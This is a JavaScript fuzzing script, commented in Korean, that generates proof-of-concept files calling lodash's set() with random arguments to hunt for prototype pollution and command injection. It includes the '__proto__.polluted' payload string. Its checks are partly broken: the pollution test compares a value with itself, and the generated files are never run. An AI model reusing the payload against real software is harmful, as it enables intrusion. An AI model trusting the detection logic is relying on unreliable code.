// ✅ PoC 후보 AST 생성기 및 실행/검증 지원
const fs = require('fs');
const path = require('path');
const astring = require('astring');
const { execSync } = require('child_process');

// 🎯 사용 가능한 값들 정의
const stringValues = ["__proto__.polluted", "yes"];
const numberValues = [0];
// const booleanValues = [true, false];
// const nullValues = [null];
// const undefinedValues = [undefined];
const objectValues = [{}];
const arrayValues = [[]];
// const functionValues = [() => {}];

// 🔄 JS 값 → AST 노드 변환
function valueToAST(value) {
  if (value === null) return { type: 'Literal', value: null };
  if (value === undefined) return { type: 'Identifier', name: 'undefined' };
  if (typeof value === 'string' || typeof value === 'number' || typeof value === 'boolean') {
    return { type: 'Literal', value: value };
  }
  if (Array.isArray(value)) return { type: 'ArrayExpression', elements: [] };
  if (typeof value === 'function') {
    return {
      type: 'FunctionExpression',
      params: [],
      body: { type: 'BlockStatement', body: [] }
    };
  }
  if (typeof value === 'object') {
    return { type: 'ObjectExpression', properties: [] };
  }
  return { type: 'Literal', value: value };
}

// 🔢 다양한 인자 조합 생성
function generateArgCombinations(argCount, limit = 10) {
  const allValues = [
    ...stringValues,
    ...numberValues,
    // ...booleanValues,
    // ...nullValues,
    // ...undefinedValues,
    ...objectValues,
    ...arrayValues,
    // ...functionValues,
  ];
  const results = [];
  for (let i = 0; i < limit; i++) {
    const args = [];
    for (let j = 0; j < argCount; j++) {
      const randVal = allValues[Math.floor(Math.random() * allValues.length)];
      args.push(randVal);
    }
    results.push(args);
  }
  return results;
}

// 📦 하나의 호출문 AST 생성: pkg.b(...)
function createCallStatementAST(funcName, args) {
  return {
    type: 'ExpressionStatement',
    expression: {
      type: 'CallExpression',
      callee: {
        type: 'MemberExpression',
        object: { type: 'Identifier', name: 'pkg' },
        property: { type: 'Identifier', name: funcName },
        computed: false,
        optional: false
      },
      arguments: args.map(valueToAST)
    }
  };
}

// 📝 단일 PoC 파일 생성 및 저장
function writeSinglePoCFile(funcName, args, index, outputDir) {
  const ast = {
    type: 'Program',
    body: [
      {
        type: 'VariableDeclaration',
        kind: 'const',
        declarations: [
          {
            type: 'VariableDeclarator',
            id: { type: 'Identifier', name: 'pkg' },
            init: {
              type: 'CallExpression',
              callee: { type: 'Identifier', name: 'require' },
              arguments: [ { type: 'Literal', value: 'lodash' } ]
            }
          }
        ]
      },
      createCallStatementAST(funcName, args)
    ],
    sourceType: 'module'
  };

  const code = astring.generate(ast);
  console.log(code);
  const filename = path.join(outputDir, `generated-poc${index + 1}.js`);
  fs.writeFileSync(filename, code, 'utf-8');
  return filename;
}

// ✅ 오염 여부 감지 (비교 기반)
function isPrototypePolluted() {
  const randomKey = `__check_${Math.random().toString(36).substring(2, 8)}`;
  const before = ({}[randomKey]);
  const after = ({}[randomKey]);
  return before !== after;
}

// 🧪 실행 및 결과 검증
function validatePoC(filePath) {
    // prototype pollution 검증어려움..ㅠ

    // 🔍 Command Injection 확인
    if (fs.existsSync("a")) {
      console.log(`🔥 [${filePath}] - Command Injection 확인됨 (파일 생성됨)`);
      fs.unlinkSync("a"); // 삭제
      return;
    }

}


// 🚀 전체 흐름: PoC 생성 + 저장 + 실행 + 검증
function runPoCMutationAndTest(funcName, argCount, limit = 10, outputDir = __dirname) {
  const argCombos = generateArgCombinations(argCount, limit);
  for (let i = 0; i < argCombos.length; i++) {
    const filePath = writeSinglePoCFile(funcName, argCombos[i], i, outputDir);
    validatePoC(filePath);
  }
}

// ▶️ 실행 예시 (b 함수, 인자 3개, 5개의 조합 테스트)
runPoCMutationAndTest("set", 3, 100);
